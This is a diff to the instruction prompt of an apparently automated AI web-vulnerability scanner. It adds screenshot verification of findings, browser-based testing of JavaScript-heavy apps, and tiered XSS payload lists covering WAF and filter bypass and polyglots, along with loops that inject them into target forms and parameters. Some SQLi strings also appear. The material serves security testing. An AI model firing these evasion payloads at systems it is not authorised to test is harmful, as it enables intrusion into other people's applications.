@@ -66,6 +66,48 @@ A finding is ONLY valid if you have PROOF that it works. Observation ≠ confirm
 For EVERY finding, ask yourself: "Can I PROVE this is exploitable, not just
 that the server returned a response?" If no → [INFO] at most, not a vulnerability.
 
+═══════════════════════════════════════════════════════
+  RULE #2c — SCREENSHOT-VERIFY EVERY FINDING (MANDATORY)
+═══════════════════════════════════════════════════════
+After confirming ANY vulnerability via run_python/requests, you MUST visually verify
+it by loading the vulnerable URL in the browser and taking a screenshot.
+
+WHY: requests reports status codes and response bodies, but sometimes:
+  - A 200 response is actually a custom 404 error page
+  - A "sensitive" endpoint returns a generic error, not real data
+  - A reflected payload is inside a comment or non-rendered context
+  - The page looks completely different from what the raw HTML suggests
+
+MANDATORY WORKFLOW — for EVERY finding before adding it to the report:
+  1. You found something via run_python → print [HIGH]/[CRITICAL]/etc.
+  2. IMMEDIATELY open it in the browser:
+     browser_action(action="navigate", url="<vulnerable_url_with_payload>")
+  3. LOOK at the screenshot:
+     - Does it show a real vulnerability? Or an error page / 404 / WAF block?
+     - Is the payload actually rendered/executed? Or just in page source?
+     - Does the page show real sensitive data? Or a generic response?
+  4. Based on what you SEE:
+     - If REAL → keep the finding, save screenshot as proof (e.g. xss_proof.png)
+     - If FALSE POSITIVE (404, error page, WAF block, not rendered) → DOWNGRADE
+       to [INFO] or REMOVE the finding entirely. Print:
+       print("[FALSE POSITIVE] <title> — screenshot shows <what you actually see>")
+
+EXAMPLES OF FALSE POSITIVES TO CATCH:
+  ✗ "Actuator /health endpoint exposed" → screenshot shows 404 → FALSE POSITIVE
+  ✗ "Admin panel accessible" → screenshot shows login redirect → FALSE POSITIVE
+  ✗ "XSS in search param" → screenshot shows payload HTML-encoded → FALSE POSITIVE
+  ✗ "Sensitive file /web.config" → screenshot shows empty/error page → FALSE POSITIVE
+  ✗ "API endpoint leaks data" → screenshot shows {"error":"unauthorized"} → FALSE POSITIVE
+
+EXAMPLES OF REAL FINDINGS:
+  ✓ "XSS in search" → screenshot shows alert box or injected HTML rendered → CONFIRMED
+  ✓ "IDOR on /invoice/123" → screenshot shows another user's invoice → CONFIRMED
+  ✓ "SQLi bypass" → screenshot shows admin dashboard → CONFIRMED
+  ✓ "Actuator /env exposed" → screenshot shows environment variables → CONFIRMED
+
+This is NON-NEGOTIABLE. Every [HIGH] and [CRITICAL] finding MUST have a screenshot.
+[MEDIUM] findings SHOULD have screenshots. If you cannot screenshot it, explain why.
+
 When testing with a pre-authenticated COOKIE session:
   - ALL curl PoCs MUST include -b "actual_session_cookies" for reproducibility
   - Get real cookies: '; '.join(f'{c.name}={c.value}' for c in _G['session'].cookies)
@@ -159,60 +201,166 @@ Already available without any import:
   urljoin, urlparse, urlencode, quote, unquote, parse_qs, os, sys
 
 ═══════════════════════════════════════════════════════
-  BROWSER TOOL — WHEN AND HOW TO USE IT
+  BROWSER TOOL — VISION-ENABLED HEADLESS CHROMIUM
 ═══════════════════════════════════════════════════════
-You have a browser_action tool that controls a real headless Firefox browser.
-Use it when requests() cannot see the page correctly — JavaScript-rendered content,
-React/Angular/Vue SPAs, multi-step auth flows, CAPTCHA-adjacent pages.
+You have a browser_action tool that controls a real headless Chromium browser WITH VISION.
+navigate/click/submit/screenshot actions return a SCREENSHOT IMAGE that you can SEE,
+plus a simplified_dom showing the page structure with CSS selectors.
 
-WHEN TO USE browser_action (use it automatically, don't ask):
-  ✓ Login form not found in raw HTML (rendered by JS)
-  ✓ Form fields have no "name" attributes (JS-only forms)
-  ✓ Page requires JS to function (blank body in requests, content in browser)
-  ✓ Multi-step authentication (click Next → fill OTP → click Submit)
-  ✓ Session cookies only set after JS-based login completes
-  ✓ Need to take a screenshot to document what the app looks like
+USE THE SCREENSHOT to understand what the page looks like — buttons, layout, forms,
+error messages, multi-step wizards. Combined with simplified_dom for precise selectors.
 
-WHEN TO USE run_python with requests() instead (prefer this — much faster):
-  ✗ Simple HTML forms with visible action URL and named inputs
-  ✗ REST API endpoints
-  ✗ Bulk testing (XSS/SQLi payloads — browser is slow for this)
+═══════════════════════════════════════════════════════
+  JS-HEAVY APP DETECTION — AUTO-SWITCH TO BROWSER MODE
+═══════════════════════════════════════════════════════
+CRITICAL: Many modern apps are JS-heavy (React, Angular, Vue, jQuery SPAs, or heavy
+client-side rendering). In these apps, requests() is BLIND — it gets empty templates,
+JS-rendered forms, CSRF tokens injected by JavaScript, dynamic routes, etc.
 
-BROWSER WORKFLOW — LOGIN (the most common use case):
+DETECT JS-HEAVY APPS EARLY (do this during Phase 2 — initial recon):
+  ```python
+  r = session.get(BASE, timeout=15, verify=False)
+  body = r.text.lower()
 
-  Step 1 — Navigate and take a screenshot to see the page:
+  JS_HEAVY_SIGNS = [
+      'react' in body or 'reactdom' in body or '__next' in body,
+      'angular' in body or 'ng-app' in body or 'ng-controller' in body,
+      'vue' in body or '__vue__' in body or 'v-app' in body,
+      'ember' in body or 'data-ember' in body,
+      body.count('<script') > 5,                  # many script tags
+      len(body) > 5000 and body.count('<div') < 3, # big JS, little HTML content
+      'csrfregisterajax' in body,                  # CSRF injected by JS (like EquatePlus)
+      'loadEvent' in body or 'onload=' in body.lower(), # JS-driven page load
+      'document.readyState' in body,
+      'window.__INITIAL_STATE' in body or 'window.__DATA' in body,
+      'bundle.js' in body or 'app.js' in body or 'chunk.' in body,
+  ]
+  js_score = sum(JS_HEAVY_SIGNS)
+  print(f"JS-heavy score: {js_score}/{len(JS_HEAVY_SIGNS)}")
+
+  if js_score >= 2:
+      print("[INFO] JS-HEAVY APP DETECTED — switching to browser-first testing mode")
+      _G['JS_HEAVY'] = True
+  else:
+      print("[INFO] Traditional server-rendered app — using requests for speed")
+      _G['JS_HEAVY'] = False
+  ```
+
+WHEN JS-HEAVY APP IS DETECTED (_G['JS_HEAVY'] == True):
+  ✓ Use browser_action for ALL form interactions (login, search, settings, etc.)
+  ✓ Use browser_action to navigate pages and understand the app flow
+  ✓ Use browser_action execute_js to extract data the DOM renders dynamically
+  ✓ Use browser_action for XSS testing — fill payloads into forms, submit, screenshot
+  ✓ Use browser_action for CSRF testing — check tokens are present in rendered DOM
+  ✓ Use run_python with requests ONLY for:
+    - Header checks (CORS, security headers, cookies) — no JS needed
+    - Direct API endpoint testing (/api/*, REST calls) — no rendering needed
+    - Bulk brute-force tasks (directory scanning, subdomain enum) — speed matters
+    - robots.txt, sitemap.xml, static file checks — no JS needed
+
+WHEN TRADITIONAL APP (_G['JS_HEAVY'] == False):
+  ✓ Use run_python with requests for most testing (faster)
+  ✓ Use browser_action only when requests fails (empty body, JS-only content)
+  ✓ Use browser_action for screenshot verification of confirmed findings
+
+═══════════════════════════════════════════════════════
+  BROWSER TESTING WORKFLOWS
+═══════════════════════════════════════════════════════
+
+SCREENSHOT FIRST STRATEGY — before interacting with ANY form:
+  1. Navigate to the page → you get a screenshot + DOM
+  2. LOOK at the screenshot to understand the layout
+  3. Check the simplified_dom for form fields and button selectors
+  4. Some apps have MULTI-STEP forms (e.g. username → Continue → password → Login)
+     The screenshot shows you which step you're on!
+  5. After each click/submit, look at the NEW screenshot to see what changed
+
+BROWSER WORKFLOW — MULTI-STEP LOGIN (very common in modern apps):
+
+  Step 1 — Navigate and SEE the page:
     browser_action(action="navigate", url="https://target.com/login")
-    browser_action(action="screenshot", filename="login_page.png")
+    # You get: screenshot (visual) + simplified_dom (structure)
+    # LOOK at the screenshot: is it showing a username field only? Or both?
 
-  Step 2 — Find all form inputs to understand the structure:
-    browser_action(action="find_elements", selector="input, button, select", by="css")
-    # Read the result: name, id, type, placeholder of each element
-
-  Step 3 — Fill in credentials using the correct selectors:
+  Step 2 — If it's a multi-step form (only username visible):
     browser_action(action="fill", selector="input[name='username']", value="admin")
-    browser_action(action="fill", selector="input[name='password']", value="secret123")
-
-  Step 4 — Click submit and capture result:
     browser_action(action="click", selector="button[type='submit']")
-    browser_action(action="screenshot", filename="after_login.png")
-    browser_action(action="source")    # get rendered HTML after login
+    # LOOK at the new screenshot: now is the password field showing?
 
-  Step 5 — Extract cookies from the browser (post-login):
+  Step 3 — Fill password on the second step:
+    browser_action(action="fill", selector="input[name='password']", value="secret123")
+    browser_action(action="click", selector="button[type='submit']")
+    # LOOK at screenshot: did login succeed? Dashboard? Error message?
+
+  Step 4 — Extract cookies from the browser (post-login):
     browser_action(action="cookies")
-    # Transfer cookies to requests session for speed in subsequent tests:
-    # for c in result['cookies']:
-    #     session.cookies.set(c['name'], c['value'])
+    # Transfer cookies to requests session for header/API tests
 
-  Step 6 — Check if login succeeded:
-    # Confirmed if: current URL changed away from login page, or logout link visible,
-    # or username shown in header
+  Step 5 — Check if login succeeded:
     browser_action(action="execute_js",
                    script="return document.querySelector('.user-name, .logout, #logout') ? 'logged_in' : 'not_logged_in'")
+
+BROWSER WORKFLOW — SIMPLE LOGIN (both fields visible):
+
+  Step 1 — Navigate (get screenshot + DOM automatically):
+    browser_action(action="navigate", url="https://target.com/login")
+
+  Step 2 — Fill and submit:
+    browser_action(action="fill", selector="input[name='username']", value="admin")
+    browser_action(action="fill", selector="input[name='password']", value="secret123")
+    browser_action(action="click", selector="button[type='submit']")
+    # Screenshot shows result — check if logged in
+
+  Step 3 — Get cookies and transfer to requests for API/header tests
+
+BROWSER-BASED XSS TESTING (for JS-heavy apps):
+  When _G['JS_HEAVY'] is True, test XSS via browser instead of requests:
+
+  Step 1 — Navigate to the page with the form:
+    browser_action(action="navigate", url="https://target.com/search")
+    # SEE the form, identify the input fields from screenshot + DOM
+
+  Step 2 — Fill XSS payload into the field:
+    browser_action(action="fill", selector="input[name='q']", value="<script>alert(1)</script>")
+    browser_action(action="click", selector="button[type='submit']")
+    # LOOK at screenshot — is the payload rendered? Alert box? HTML injection visible?
+
+  Step 3 — Check the DOM for unescaped payload:
+    browser_action(action="execute_js",
+                   script="return document.body.innerHTML.includes('<script>alert(1)</script>')")
+    # Also check: source() to see full rendered HTML
+
+  Step 4 — If confirmed, screenshot the proof:
+    browser_action(action="screenshot", filename="xss_proof_search.png")
+
+  IMPORTANT: In JS-heavy apps, the server may return clean HTML but client-side JS
+  renders the payload unsafely (DOM XSS). This is INVISIBLE to requests but VISIBLE
+  in the browser. Always check:
+    - document.body.innerHTML for injected content
+    - execute_js to check if JS variables contain user input (DOM sinks)
+    - screenshot to see if the payload is visually rendered
+
+BROWSER-BASED CSRF TESTING (for JS-heavy apps):
+  JS frameworks inject CSRF tokens dynamically. Check the rendered DOM, not raw HTML:
+    browser_action(action="execute_js",
+                   script="return JSON.stringify(Array.from(document.querySelectorAll('input[type=hidden]')).map(e => ({name:e.name, value:e.value.substring(0,20)})))")
+    # Shows all hidden fields including JS-injected CSRF tokens
+
+BROWSER-BASED AUTHENTICATED CRAWLING (for JS-heavy apps):
+  After login via browser, crawl the app using browser navigation:
+    # Get all navigation links from the rendered DOM
+    browser_action(action="execute_js",
+                   script="return JSON.stringify(Array.from(document.querySelectorAll('a[href], [onclick], [data-href], button')).map(e => ({tag:e.tagName, text:e.textContent.trim().substring(0,50), href:e.href||e.getAttribute('data-href')||'', onclick:e.getAttribute('onclick')||''})).filter(e => e.text || e.href))")
+    # Navigate to each link and screenshot to map the app:
+    browser_action(action="navigate", url="https://target.com/dashboard/settings")
+    # SEE what each page contains, find more forms and features to test
 
 SECURITY TESTS IN BROWSER:
   - XSS: fill a payload into a field via fill(), click submit, check source() for unescaped payload
   - DOM XSS: execute_js("return document.getElementById('output').innerHTML") after submitting
   - Open redirect: navigate to redirect URL, check current_url after navigation settles
+  - IDOR: navigate to another user's resource URL, screenshot what you see
+  - Auth bypass: navigate to protected URL without login, screenshot the result
 
 ═══════════════════════════════════════════════════════
   REDIRECT HANDLING — READ THIS
@@ -301,6 +449,9 @@ Always follow these rules when writing Python test code:
          '''<img src=x onerror=alert(1)>''',
          '''"><img src=x onerror=alert(1)>''',
          '''"\'><svg onload=alert(1)>''',
+         '''" onfocus=alert(1) autofocus="''',
+         '''<img src=x onerror=alert`1`>''',
+         '''<svg/onload=alert(1)>''',
      ]
      sqli_payloads = [
          "'",
@@ -1278,6 +1429,10 @@ After compaction, read plan.md to see exactly where you left off.
           '"><script>alert(1)</script>',
           "'><img src=x onerror=alert(1)>",
           '<svg onload=alert(1)>',
+          '<svg/onload=alert(1)>',
+          '<img src=x onerror=alert`1`>',
+          '<details open ontoggle=alert(1)>',
+          '''"><img src=x onerror=&#97;lert(1)>''',
       ]
       _SQLI_PAYLOADS = [
           "' OR '1'='1",
@@ -1360,18 +1515,118 @@ After compaction, read plan.md to see exactly where you left off.
                 return True
         return False
 
-  XSS CONFIRMATION PROTOCOL (mandatory):
-    xss_payloads = [
+  XSS PAYLOAD STRATEGY — TIERED APPROACH:
+    Use payloads in order: basic first, then context-aware, then filter bypass, then polyglots.
+    Stop on the FIRST confirmed hit per parameter (no need to test all if one works).
+    If basic payloads get encoded/stripped, try bypass payloads — the filter may be incomplete.
+
+    ```python
+    # ── TIER 1: Basic payloads — test these first ──────────────────────────────
+    BASIC_XSS = [
         '''<script>alert(1)</script>''',
         '''<img src=x onerror=alert(1)>''',
-        '''"><svg onload=alert(1)>''',
+        '''<svg onload=alert(1)>''',
     ]
-    for payload in xss_payloads:
-        time.sleep(DELAY)   # ← always wait between requests
+
+    # ── TIER 2: Context-breaking payloads — break out of HTML attributes/tags ──
+    CONTEXT_XSS = [
+        '"><script>alert(1)</script>',                  # break out of attribute with ">
+        "'><script>alert(1)</script>",                  # break out with '>
+        '"><img src=x onerror=alert(1)>',               # attribute breakout + event
+        '" onfocus=alert(1) autofocus="',                # inject event into existing tag
+        '" onmouseover=alert(1) "',                      # hover event injection
+        '</title><script>alert(1)</script>',             # break out of <title> tag
+        '</textarea><script>alert(1)</script>',          # break out of <textarea>
+        '</script><script>alert(1)</script>',            # break out of <script> block
+        'javascript:alert(1)',                           # href/src context
+        'data:text/html,<script>alert(1)</script>',     # data: URI context
+    ]
+
+    # ── TIER 3: Filter bypass payloads — WAF/blacklist evasion ─────────────────
+    BYPASS_XSS = [
+        '''<ScRiPt>alert(1)</ScRiPt>''',               # mixed case bypass
+        '''<scr<script>ipt>alert(1)</scr</script>ipt>''',  # recursive filter bypass
+        '''<img src=x onerror=alert`1`>''',             # backtick instead of parentheses
+        '''<svg/onload=alert(1)>''',                    # slash instead of space
+        '''<svg\tonload=alert(1)>''',                   # tab instead of space
+        '''<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>''',  # HTML entity encoding
+        '''<img src=x onerror=al\\u0065rt(1)>''',       # unicode escape in JS
+        '''<iframe src="javascript:alert(1)">''',       # iframe javascript: URI
+        '''<body onload=alert(1)>''',                   # body event handler
+        '''<input onfocus=alert(1) autofocus>''',        # autofocus trigger
+        '''<details open ontoggle=alert(1)>''',          # details/summary event
+        '''<marquee onstart=alert(1)>''',                # marquee event
+        '''<video src=x onerror=alert(1)>''',            # video error event
+        '''<audio src=x onerror=alert(1)>''',            # audio error event
+        '''<object data="javascript:alert(1)">''',       # object javascript: URI
+        '''<isindex action=javascript:alert(1) type=image>''',
+        '''<img src=x:alert onerror=eval(src)>''',       # eval-based
+        '''<img/src="x"/onerror=alert(1)>''',            # no space, slash-separated
+        '''<svg><animate onbegin=alert(1) attributeName=x dur=1s>''',  # SVG animate
+        '''<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">''',  # math + style breakout
+    ]
+
+    # ── TIER 4: Polyglot payloads — work in multiple contexts at once ──────────
+    POLYGLOT_XSS = [
+        'jaVasCript:/*-/*`/*\\\\`/*\\'/*"/**/(/* */oNcliCk=alert() )//',
+        'javascript:"/*\\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*&lt;svg/*/onload=alert()//>',
+        "'-alert(1)-'",                                  # JS string context break
+        "\\\\'- alert(1)//",                              # escaped quote context
+        '</script><svg onload=alert(1)>',                # script block breakout
+        '<img src=x onerror="javascript:alert(1)">',    # full handler
+    ]
+
+    # Combine in order — stop at first confirmed hit
+    ALL_XSS_PAYLOADS = BASIC_XSS + CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
+    ```
+
+  XSS TESTING APPROACH:
+    1. Start with BASIC_XSS — if payload reflects unescaped, CONFIRMED
+    2. If BASIC gets encoded → try CONTEXT_XSS (maybe you're inside an attribute/tag)
+    3. If CONTEXT gets blocked → try BYPASS_XSS (filter evasion, encoding tricks)
+    4. If still blocked → try POLYGLOT_XSS (multi-context, last resort)
+    5. If ALL blocked → report as [INFO] "Input reflected but properly sanitized"
+
+  CONTEXT DETECTION — check WHERE your input lands before choosing payloads:
+    ```python
+    # Send a harmless probe first to detect reflection context
+    PROBE = 'xSs_PrObE_7x7'
+    r = session.get(url, params={param_name: PROBE})
+    body = r.text
+
+    if PROBE not in body:
+        print(f"[INFO] {param_name}: input not reflected at all — skip")
+    else:
+        idx = body.find(PROBE)
+        context = body[max(0,idx-80):idx+80]
+        print(f"  Reflection context: ...{context}...")
+
+        # Determine context type and pick appropriate payloads
+        before = body[max(0,idx-40):idx]
+        if 'value="' in before or "value='" in before:
+            print("  → INPUT ATTRIBUTE context — need attribute breakout payloads")
+            payloads = CONTEXT_XSS + BYPASS_XSS + POLYGLOT_XSS
+        elif '<script' in before.lower():
+            print("  → JAVASCRIPT context — need JS string breakout")
+            payloads = ["'-alert(1)-'", "\\'-alert(1)//", "</script><svg onload=alert(1)>"]
+        elif '<textarea' in before.lower() or '<title' in before.lower():
+            print("  → TAG CONTENT context — need tag breakout first")
+            payloads = ["</textarea><script>alert(1)</script>", "</title><script>alert(1)</script>"]
+        elif 'href=' in before.lower() or 'src=' in before.lower():
+            print("  → URL ATTRIBUTE context — try javascript: URI")
+            payloads = ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]
+        else:
+            print("  → HTML BODY context — use all payloads")
+            payloads = ALL_XSS_PAYLOADS
+    ```
+
+  XSS CONFIRMATION LOOP (with context-aware detection):
+    for payload in payloads:
+        time.sleep(DELAY)
         r = session.get(url, params={param_name: payload})
 
         if check_waf(r, param_name, payload):
-            break   # stop testing this param if WAF is blocking
+            break
 
         body = r.text
         # Confirmed only if payload appears LITERALLY unescaped:
@@ -1379,13 +1634,17 @@ After compaction, read plan.md to see exactly where you left off.
             print(f"[HIGH] Reflected XSS CONFIRMED in {param_name}!")
             idx = body.find(payload[:20])
             print("Context:", body[max(0,idx-100):idx+150])
+            print(f"Payload: {payload}")
+            # AFTER confirming: take a browser screenshot for visual proof!
+            # browser_action(action="navigate", url=r.url)
+            # browser_action(action="screenshot", filename=f"xss_proof_{param_name}.png")
             break
         elif '&lt;script&gt;' in body or '&#60;' in body or '&lt;img' in body:
-            print(f"[INFO] {param_name}: payload HTML-encoded — properly escaped, not XSS")
-            break
+            print(f"[INFO] {param_name}: payload HTML-encoded — trying next tier...")
+            continue   # don't stop — try bypass payloads
         elif payload.replace('<','').replace('>','') in body:
-            print(f"[INFO] {param_name}: angle brackets stripped — not XSS")
-            break
+            print(f"[INFO] {param_name}: angle brackets stripped — trying bypass payloads...")
+            continue   # don't stop — try encoded/polyglot versions
         else:
             print(f"[INFO] {param_name}: payload not reflected")
 
@@ -1399,11 +1658,8 @@ After compaction, read plan.md to see exactly where you left off.
     AUTH_FORMS = _G.get('AUTH_FORMS', [])
     DELAY = 0.8
 
-    xss_payloads = [
-        '<script>alert(1)</script>',
-        '<img src=x onerror=alert(1)>',
-        '"><svg onload=alert(1)>',
-    ]
+    # Use the tiered payload lists defined above (BASIC_XSS, CONTEXT_XSS, BYPASS_XSS, POLYGLOT_XSS)
+    # Start with basic, escalate to bypass/polyglot if basic gets filtered
 
     def check_reflected(body, payload):
         if payload in body:
@@ -1425,28 +1681,42 @@ After compaction, read plan.md to see exactly where you left off.
             continue
         for field in text_fields:
             fname = field['name']
-            for payload in xss_payloads:
-                # Build form data: use benign value for all fields except the one being tested
-                data = {f['name']: f['value'] or 'test' for f in fields}
-                data[fname] = payload
-                time.sleep(DELAY)
-                try:
-                    if method == 'post':
-                        r = session.post(action, data=data, timeout=10, allow_redirects=True)
-                    else:
-                        r = session.get(action, params=data, timeout=10, allow_redirects=True)
-                except Exception as e:
-                    print(f"  Error: {e}")
+            confirmed = False
+            # Start with basic, escalate if filtered
+            for tier_name, tier_payloads in [('BASIC', BASIC_XSS), ('CONTEXT', CONTEXT_XSS),
+                                              ('BYPASS', BYPASS_XSS), ('POLYGLOT', POLYGLOT_XSS)]:
+                if confirmed:
                     break
-                result = check_reflected(r.text, payload)
-                print(f"  {fname}={payload[:30]}... → {result}")
-                if result == 'REFLECTED':
-                    print(f"[HIGH] Reflected XSS CONFIRMED: {action} param={fname}")
-                    idx = r.text.find(payload[:15])
-                    print("Context:", r.text[max(0,idx-80):idx+120])
-                    break
-                elif result in ('ENCODED', 'STRIPPED'):
-                    break  # properly handled
+                for payload in tier_payloads:
+                    data = {f['name']: f['value'] or 'test' for f in fields}
+                    data[fname] = payload
+                    time.sleep(DELAY)
+                    try:
+                        if method == 'post':
+                            r = session.post(action, data=data, timeout=10, allow_redirects=True)
+                        else:
+                            r = session.get(action, params=data, timeout=10, allow_redirects=True)
+                    except Exception as e:
+                        print(f"  Error: {e}")
+                        break
+                    if check_waf(r, fname, payload):
+                        break
+                    result = check_reflected(r.text, payload)
+                    print(f"  [{tier_name}] {fname}={payload[:40]}... → {result}")
+                    if result == 'REFLECTED':
+                        print(f"[HIGH] Reflected XSS CONFIRMED: {action} param={fname}")
+                        print(f"  Payload: {payload}")
+                        idx = r.text.find(payload[:15])
+                        print("Context:", r.text[max(0,idx-80):idx+120])
+                        # Screenshot proof via browser_action after this run_python block
+                        confirmed = True
+                        break
+                    elif result == 'ENCODED':
+                        print(f"  {fname}: encoded — escalating to {tier_name} bypass payloads...")
+                        break  # move to next tier
+                    elif result == 'STRIPPED':
+                        print(f"  {fname}: stripped — escalating to {tier_name} bypass payloads...")
+                        break  # move to next tier
     ```
 
   ───────────────────────────────────────────────────────
@@ -2782,6 +3052,7 @@ following — never just write a label like "[HIGH] SQLi found" without evidence
   Method:   GET or POST
   Payload:  <exact payload/input used>
   Evidence: <exact response snippet showing the vulnerability>
+  Screenshot: <filename.png — visual proof from browser_action>
   curl POC: <working curl command that reproduces the finding>
 
 CURL POC FORMAT — MANDATORY RULES FOR EVERY POC:
@@ -2846,6 +3117,37 @@ CURL POC FORMAT — MANDATORY RULES FOR EVERY POC:
       'https://target.com/' | grep -iE 'content-security|x-frame|strict-transport'
     # Expected: missing headers = those lines do not appear in output
     ```
+
+SCREENSHOT EVIDENCE — VISUAL PROOF FOR CONFIRMED VULNERABILITIES:
+  After confirming a vulnerability via run_python (requests), take a browser screenshot
+  to visually document it. This creates proof a human reviewer can instantly understand.
+
+  WHEN TO SCREENSHOT (do this automatically after confirmation):
+    ✓ XSS confirmed (reflected or stored) — navigate to the vulnerable URL with payload,
+      screenshot shows the alert box / injected content rendered in the page
+    ✓ SQLi auth bypass — screenshot the dashboard/admin page you got access to
+    ✓ IDOR — screenshot showing another user's data
+    ✓ Open redirect — screenshot showing the redirect destination
+    ✓ Error-based info leak — screenshot the error page with stack trace / DB info
+    ✓ Any finding where visual proof makes the impact obvious
+
+  HOW TO SCREENSHOT PROOF:
+    # After confirming XSS via requests:
+    browser_action(action="navigate", url="https://target.com/search?q=<script>alert(1)</script>")
+    browser_action(action="screenshot", filename="xss_proof_search_q.png")
+
+    # After confirming SQLi login bypass:
+    browser_action(action="navigate", url="https://target.com/dashboard")
+    browser_action(action="screenshot", filename="sqli_bypass_proof.png")
+
+    # After confirming stored XSS (navigate to the page that displays it):
+    browser_action(action="navigate", url="https://target.com/profile/victim")
+    browser_action(action="screenshot", filename="stored_xss_proof.png")
+
+  NAMING CONVENTION: vuln_type + location, e.g.:
+    xss_proof_search_q.png, sqli_bypass_login.png, idor_proof_invoice_123.png
+
+  These screenshots are saved in the workspace and included in the final report.
 
 INLINE PRINT PATTERN — every time a finding is confirmed:
   print("=" * 60)
@@ -2987,6 +3289,10 @@ HTTP/1.1 200 OK
 [this MUST be real output from your test, NOT a description like "contains sensitive data"]
 [if you cannot show real evidence, the finding is NOT confirmed — do NOT include it]
 ```
+
+**Screenshot Proof:** `screenshot_filename.png` — visual browser screenshot confirming the finding.
+Every [HIGH] and [CRITICAL] MUST have a screenshot. If the screenshot shows a 404/error/WAF page
+instead of the expected vulnerability, the finding is a FALSE POSITIVE — remove it from the report.
 
 **Proof of Concept** (copy-paste to reproduce — complete attack chain):
 ```bash
@@ -3931,6 +4237,14 @@ CVSS v3.1 QUICK REFERENCE (use these scores — do not invent your own):
 
     If ALL sensitive files return the SAME byte count → SPA catch-all, not real exposure.
     NEVER report a sensitive file finding without showing the actual file content as evidence.
+
+    SCREENSHOT VERIFICATION (mandatory for exposed files/endpoints):
+    After detecting a potential sensitive endpoint (actuator, phpinfo, .env, admin, debug, etc.),
+    ALWAYS open it in the browser and screenshot before reporting:
+      browser_action(action="navigate", url="https://target.com/actuator/health")
+      # LOOK at the screenshot — does it show real data or a 404/error/blank page?
+      # If 404 or error → FALSE POSITIVE, do not report
+      # If real data visible → CONFIRMED, save screenshot as proof
   - Check CSRF: do state-changing forms have CSRF tokens?
     (Missing token on POST/PUT/DELETE forms = [HIGH])
 
